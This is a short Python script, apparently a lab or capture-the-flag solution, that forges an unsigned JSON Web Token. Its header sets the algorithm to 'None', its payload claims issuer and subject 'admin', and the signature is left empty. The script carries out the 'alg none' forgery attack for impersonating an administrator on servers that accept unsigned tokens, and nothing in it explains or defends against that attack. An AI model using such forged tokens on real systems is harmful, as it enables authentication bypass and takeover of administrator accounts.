import base64
def jwtBase64Encode(x):
    return base64.b64encode(x.encode('utf-8')).decode().replace('+', '-').replace('/', '_').replace('=', '')
header = '{"alg": "None","typ": "JWT"}'
payload = '{"iss": "admin","iat": 1696320196,"exp": 1696327396,"nbf": 1696320196,"sub": "admin","jti": "5fc0ad01ade8340f4c684b39209966a8"} '

print(jwtBase64Encode(header)+'.'+jwtBase64Encode(payload)+'.')
